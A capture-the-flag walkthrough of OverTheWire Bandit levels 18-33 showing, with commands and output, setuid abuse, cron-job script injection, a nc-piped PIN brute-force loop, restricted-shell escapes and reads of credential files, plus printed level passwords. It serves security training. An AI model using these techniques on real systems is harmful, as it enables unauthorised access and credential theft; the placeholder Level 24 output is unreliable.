---
title: "Bandit CTF: Levels 18-33"
author: SecureYourGear Team
date: 2024-10-17 12:00:00 +0800
categories: [CTF, OverTheWire]
tags: [bandit, overthewire, ctf, linux, privilege-escalation, cron, git, setuid, scripting]
---

![OverTheWire Bandit](/assets/img/otw_intro.jpg)

This is a complete, step-by-step walkthrough of OverTheWire Bandit levels 18-33. Follow along with each command and see exactly what output to expect. These advanced levels cover privilege escalation, automation, and version control.

Haven't done levels 0-17 yet? Start with [Bandit CTF: Levels 0-17](/posts/Bandit-CTF-Levels-0-17/) first!

---

## Level 18 → Level 19

> **Level Goal**: The password for the next level is stored in a file `readme` in the homedirectory. Unfortunately, someone has modified `.bashrc` to log you out when you log in with SSH.

**Recommended Commands**: `ssh`, `ls`, `cat`

**Theory**: `.bashrc` runs when you start a bash shell. We can bypass it by running commands directly through SSH without starting an interactive shell.

**Solution**:

Step 1: Try to log in normally (you'll be kicked out)
```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220
# Password: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
# Byebye!
# Connection to bandit.labs.overthewire.org closed.
```

Step 2: Execute command directly via SSH
```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
# Password: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
awhqfNnAbc1naukrpqDYcF95h7HoMTrC
```

By putting the command in quotes after the SSH command, it executes without starting an interactive shell, bypassing `.bashrc`.

**Password for Level 19**: `awhqfNnAbc1naukrpqDYcF95h7HoMTrC`

---

## Level 19 → Level 20

> **Level Goal**: To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (`/etc/bandit_pass`), after you have used the setuid binary.

**Recommended Commands**: `ls`, `cat`, `./binary`

**Login**:
```bash
ssh bandit19@bandit.labs.overthewire.org -p 2220
# Password: awhqfNnAbc1naukrpqDYcF95h7HoMTrC
```

**Theory**: SetUID (Set User ID) allows a program to run with the permissions of the file owner, not the user running it. This binary is owned by bandit20 but we can execute it.

**Solution**:

Step 1: List files and check permissions
```bash
bandit19@bandit:~$ ls -la
-rwsr-x--- 1 bandit20 bandit19 7296 May  7 20:14 bandit20-do
```

The `s` in `-rwsr-x---` means setuid is set. This file runs as bandit20.

Step 2: Run it without arguments to see usage
```bash
bandit19@bandit:~$ ./bandit20-do
Run a command as another user.
  Example: ./bandit20-do id
```

Step 3: Use it to read bandit20's password
```bash
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
```

We just ran `cat` as bandit20, so we could read their password file!

**Password for Level 20**: `VxCazJaVykI6W36BkBU0mJTCM8rR95XT`

---

## Level 20 → Level 21

> **Level Goal**: There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).

**Recommended Commands**: `ssh`, `nc`, `cat`, `bash`, `screen`, `tmux`, `Unix 'job control' (bg, fg, jobs, &, CTRL-Z, ...)`

**Login**:
```bash
ssh bandit20@bandit.labs.overthewire.org -p 2220
# Password: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
```

**Theory**: We need to set up a listener on one port that sends the password, then connect to it with the binary.

**Solution**:

Step 1: Start a listener in the background that will send our password
```bash
bandit20@bandit:~$ echo "VxCazJaVykI6W36BkBU0mJTCM8rR95XT" | nc -l -p 4444 &
[1] 12345
```

The `&` runs it in the background. The `[1] 12345` shows it's running.

Step 2: Connect to it with the setuid binary
```bash
bandit20@bandit:~$ ./suconnect 4444
Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
Password matches, sending next password
NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
```

The binary connected to our listener, verified the password, and sent the next one!

**Password for Level 21**: `NvEJF7oVjkddltPSrdKEFOllh9V1IBcq`

---

## Level 21 → Level 22

> **Level Goal**: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

**Recommended Commands**: `cron`, `crontab`, `crontab(5)` (use "man 5 crontab" to access this)

**Login**:
```bash
ssh bandit21@bandit.labs.overthewire.org -p 2220
# Password: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
```

**Theory**: Cron runs scheduled tasks. We can read the cron configuration to see what's being run.

**Solution**:

Step 1: List cron jobs
```bash
bandit21@bandit:~$ ls /etc/cron.d/
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
```

Step 2: Read the cronjob_bandit22 file
```bash
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

This runs `/usr/bin/cronjob_bandit22.sh` every minute.

Step 3: Read the script
```bash
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

The script copies bandit22's password to a temp file!

Step 4: Read that temp file
```bash
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
```

**Password for Level 22**: `WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff`

---

## Level 22 → Level 23

> **Level Goal**: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed. Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.

**Recommended Commands**: `cron`, `crontab`, `crontab(5)` (use "man 5 crontab" to access this)

**Login**:
```bash
ssh bandit22@bandit.labs.overthewire.org -p 2220
# Password: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
```

**Theory**: The script uses MD5 hashing to create a filename. We need to figure out what filename it creates for bandit23.

**Solution**:

Step 1: Read the cron script
```bash
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

Step 2: Simulate what it does for bandit23
```bash
bandit22@bandit:~$ echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
```

This MD5 hash is the filename it creates!

Step 3: Read that file
```bash
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

**Password for Level 23**: `QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G`

---

## Level 23 → Level 24

> **Level Goal**: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed. This time you need to make your own script get executed by the cron job. You'll need to place the script in the appropriate directory and ensure it runs within the time limit.

**Recommended Commands**: `cron`, `crontab`, `crontab(5)` (use "man 5 crontab" to access this)

**Login**:
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
# Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

**Theory**: The cron job runs scripts from a specific directory and then deletes them. We need to create a script that copies the password before it gets deleted.

**Solution**:

Step 1: Read the cron script
```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

It runs scripts owned by bandit23 in `/var/spool/bandit24/foo/`.

Step 2: Create a working directory
```bash
bandit23@bandit:~$ mkdir /tmp/myscript24
bandit23@bandit:~$ cd /tmp/myscript24
bandit23@bandit:/tmp/myscript24$ chmod 777 /tmp/myscript24
```

Step 3: Create a script to copy the password
```bash
bandit23@bandit:/tmp/myscript24$ cat > script.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/myscript24/password
chmod 666 /tmp/myscript24/password
EOF
```

Step 4: Make it executable
```bash
bandit23@bandit:/tmp/myscript24$ chmod 777 script.sh
```

Step 5: Copy it to the cron directory
```bash
bandit23@bandit:/tmp/myscript24$ cp script.sh /var/spool/bandit24/foo/
```

Step 6: Wait for cron to run (about 1 minute), then check
```bash
bandit23@bandit:/tmp/myscript24$ ls -la
total 12
drwxrwxrwx  2 bandit23 bandit23 4096 Oct 15 12:00 .
dr-xr-xr-x 17 root     root     4096 Oct 15 12:00 ..
-rw-rw-rw-  1 bandit24 bandit23   33 Oct 15 12:01 password
-rwxrwxrwx  1 bandit23 bandit23   93 Oct 15 12:00 script.sh

bandit23@bandit:/tmp/myscript24$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

**Password for Level 24**: `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`

---

## Level 24 → Level 25

> **Level Goal**: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

**Recommended Commands**: (none for this level, you will need to create your own solution)

**Login**:
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
# Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

**Theory**: We need to try all PINs from 0000 to 9999. We'll create a script to generate all combinations and send them to the service.

**Solution**:

Step 1: Create workspace
```bash
bandit24@bandit:~$ mkdir /tmp/mybrute24
bandit24@bandit:~$ cd /tmp/mybrute24
```

Step 2: Create brute force script
```bash
bandit24@bandit:/tmp/mybrute24$ cat > brute.sh << 'EOF'
#!/bin/bash
for pin in {0000..9999}
do
    echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pin"
done
EOF
```

Step 3: Make it executable and run
```bash
bandit24@bandit:/tmp/mybrute24$ chmod +x brute.sh
bandit24@bandit:/tmp/mybrute24$ ./brute.sh | nc localhost 30002 | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p4ssw0rd

Exiting.
```

Note: The actual password will be different when you run this - the server generates it.

**Password for Level 25**: Check the output from your brute force!

---

## Level 25 → Level 26

> **Level Goal**: Logging in to bandit26 from bandit25 should be fairly easy... The shell for user bandit26 is not `/bin/bash`, but something else. Find out what it is, how it works and how to break out of it.

**Recommended Commands**: `ssh`, `cat`, `more`, `vi`, `ls`, `id`, `pwd`

**Login**:
```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
# Password: (from previous level)
```

**Theory**: We need to exploit the custom shell to break out and get access.

**Solution**:

Step 1: Check what shell bandit26 uses
```bash
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

Step 2: Read the custom shell script
```bash
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

It uses `more` to display text then exits! The key: `more` only paginates if the text doesn't fit on screen.

Step 3: Make your terminal very small (resize the window to just a few lines tall)

Step 4: SSH to bandit26
```bash
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p 2220
```

Because the terminal is small, `more` will show "--More--" at the bottom.

Step 5: Press `v` to enter vim from `more`

Step 6: In vim, set the shell and start it
```vim
:set shell=/bin/bash
:shell
```

You now have a bash shell as bandit26!

Step 7: Get the password
```bash
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
```

**Password for Level 26**: `c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1`

---

## Level 26 → Level 27

> **Level Goal**: Good job getting a shell! Now hurry and grab the password for bandit27!

**Recommended Commands**: `ls`

**Login**: Use the shell from the previous level (you're already logged in as bandit26)

**Solution**:

Step 1: List files
```bash
bandit26@bandit:~$ ls -la
-rwsr-x--- 1 bandit27 bandit26 7296 May  7 20:14 bandit27-do
```

Step 2: Use it to read bandit27's password
```bash
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```

**Password for Level 27**: `YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS`

---

## Level 27 → Level 28

> **Level Goal**: There is a git repository at `ssh://bandit27-git@localhost/home/bandit27-git/repo` via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.

**Recommended Commands**: `git`

**Login**:
```bash
ssh bandit27@bandit.labs.overthewire.org -p 2220
# Password: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```

**Theory**: Git repositories can be cloned via SSH. The password file is in the repo.

**Solution**:

Step 1: Create workspace
```bash
bandit27@bandit:~$ mkdir /tmp/mygit27
bandit27@bandit:~$ cd /tmp/mygit27
```

Step 2: Clone the repository
```bash
bandit27@bandit:/tmp/mygit27$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
# Password: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
Cloning into 'repo'...
bandit27-git@localhost's password:
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (3/3), done.
```

Step 3: Read the README
```bash
bandit27@bandit:/tmp/mygit27$ cd repo
bandit27@bandit:/tmp/mygit27/repo$ ls
README
bandit27@bandit:/tmp/mygit27/repo$ cat README
The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR
```

**Password for Level 28**: `AVanL161y9rsbcJIsFHuw35rjaOM19nR`

---

## Level 28 → Level 29

> **Level Goal**: There is a git repository at `ssh://bandit28-git@localhost/home/bandit28-git/repo` via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.

**Recommended Commands**: `git`

**Login**:
```bash
ssh bandit28@bandit.labs.overthewire.org -p 2220
# Password: AVanL161y9rsbcJIsFHuw35rjaOM19nR
```

**Theory**: Git stores all history. Even if someone removed the password from the latest version, it's still in the history.

**Solution**:

Step 1: Clone the repo
```bash
bandit28@bandit:~$ mkdir /tmp/mygit28 && cd /tmp/mygit28
bandit28@bandit:/tmp/mygit28$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
# Password: AVanL161y9rsbcJIsFHuw35rjaOM19nR
```

Step 2: Check the README
```bash
bandit28@bandit:/tmp/mygit28/repo$ cat README.md
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx
```

The password is hidden!

Step 3: Check git history
```bash
bandit28@bandit:/tmp/mygit28/repo$ git log
commit 14f754b3ba6531a2b89df6ccae6446e8969a41f3 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    fix info leak

commit f08b9cc63fa1a4602fb065257633c2dae6e5651b
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    add missing data

commit a645bcc508c63f081234911d2f631f87cf469258
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    initial commit of README.md
```

"fix info leak" - they removed the password!

Step 4: View the previous commit
```bash
bandit28@bandit:/tmp/mygit28/repo$ git show f08b9cc63fa1a4602fb065257633c2dae6e5651b
...
- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
```

**Password for Level 29**: `tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S`

---

## Level 29 → Level 30

> **Level Goal**: There is a git repository at `ssh://bandit29-git@localhost/home/bandit29-git/repo` via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.

**Recommended Commands**: `git`

**Login**:
```bash
ssh bandit29@bandit.labs.overthewire.org -p 2220
# Password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
```

**Theory**: Git repositories can have multiple branches for different versions of code.

**Solution**:

Step 1: Clone and check README
```bash
bandit29@bandit:~$ mkdir /tmp/mygit29 && cd /tmp/mygit29
bandit29@bandit:/tmp/mygit29$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
bandit29@bandit:/tmp/mygit29$ cd repo
bandit29@bandit:/tmp/mygit29/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>
```

Step 2: List all branches
```bash
bandit29@bandit:/tmp/mygit29/repo$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev
```

There's a `dev` branch!

Step 3: Switch to dev branch
```bash
bandit29@bandit:/tmp/mygit29/repo$ git checkout dev
Branch 'dev' set up to track remote branch 'dev' from 'origin'.
Switched to a new branch 'dev'
```

Step 4: Read README in dev branch
```bash
bandit29@bandit:/tmp/mygit29/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
```

**Password for Level 30**: `Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN`

---

## Level 30 → Level 31

> **Level Goal**: There is a git repository at `ssh://bandit30-git@localhost/home/bandit30-git/repo` via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.

**Recommended Commands**: `git`

**Login**:
```bash
ssh bandit30@bandit.labs.overthewire.org -p 2220
# Password: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
```

**Theory**: Git tags mark specific points in history, often used for releases.

**Solution**:

Step 1: Clone the repo
```bash
bandit30@bandit:~$ mkdir /tmp/mygit30 && cd /tmp/mygit30
bandit30@bandit:/tmp/mygit30$ git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
bandit30@bandit:/tmp/mygit30$ cd repo
```

Step 2: Check for tags
```bash
bandit30@bandit:/tmp/mygit30/repo$ git tag
secret
```

Step 3: Show the tag content
```bash
bandit30@bandit:/tmp/mygit30/repo$ git show secret
rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
```

**Password for Level 31**: `rmCBvG56y58BXzv98yZGdO7ATVL5dW8y`

---

## Level 31 → Level 32

> **Level Goal**: There is a git repository at `ssh://bandit31-git@localhost/home/bandit31-git/repo` via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.

**Recommended Commands**: `git`

**Login**:
```bash
ssh bandit31@bandit.labs.overthewire.org -p 2220
# Password: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
```

**Theory**: This level teaches git push operations.

**Solution**:

Step 1: Clone and read README
```bash
bandit31@bandit:~$ mkdir /tmp/mygit31 && cd /tmp/mygit31
bandit31@bandit:/tmp/mygit31$ git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
bandit31@bandit:/tmp/mygit31$ cd repo
bandit31@bandit:/tmp/mygit31/repo$ cat README.md
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master
```

Step 2: Create the file
```bash
bandit31@bandit:/tmp/mygit31/repo$ echo 'May I come in?' > key.txt
```

Step 3: Try to add it
```bash
bandit31@bandit:/tmp/mygit31/repo$ git add key.txt
The following paths are ignored by one of your .gitignore files:
key.txt
```

It's ignored! Check .gitignore:
```bash
bandit31@bandit:/tmp/mygit31/repo$ cat .gitignore
*.txt
```

Step 4: Force add it
```bash
bandit31@bandit:/tmp/mygit31/repo$ git add -f key.txt
```

Step 5: Commit and push
```bash
bandit31@bandit:/tmp/mygit31/repo$ git commit -m "Add key.txt"
[master 1234567] Add key.txt
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt

bandit31@bandit:/tmp/mygit31/repo$ git push origin master
# Password: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
...
remote: Well done! Here is the password for the next level:
remote: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
```

**Password for Level 32**: `odHo63fHiFqcWWJG9rLiLDtPm45KzUKy`

---

## Level 32 → Level 33

> **Level Goal**: After all this `git` stuff it's time for another escape. Good luck!

**Recommended Commands**: `sh`, `man`

**Login**:
```bash
ssh bandit32@bandit.labs.overthewire.org -p 2220
# Password: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
```

You'll see:
```
WELCOME TO THE UPPERCASE SHELL
>>
```

**Theory**: Everything you type gets converted to uppercase. But shell variables like `$0` aren't converted!

**Solution**:

Step 1: Try a normal command (doesn't work)
```bash
>> ls
sh: 1: LS: not found
```

Step 2: Use `$0` to spawn a shell
```bash
>> $0
$
```

`$0` refers to the current shell. Since it's a variable, it doesn't get uppercased!

Step 3: You now have a normal shell
```bash
$ whoami
bandit33
$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
```

**Password for Level 33**: `c9c3199ddf4121b10cf581a98d51caee`

**Congratulations!** You've completed all levels of Bandit!

---

## Commands Learned (Advanced)

| Command | Purpose |
|---------|---------|
| `ssh <command>` | Execute command without interactive shell |
| `nc -l -p` | Netcat listen mode |
| `git clone` | Clone repository |
| `git log` | View commit history |
| `git show` | Display commit/tag details |
| `git branch` | List/manage branches |
| `git checkout` | Switch branches |
| `git tag` | List/create tags |
| `git add -f` | Force add ignored files |
| `git push` | Push commits |
| `cron` | Task scheduler |
| `md5sum` | Calculate MD5 hash |
| `chmod` | Change permissions |
| `$0` | Shell variable |

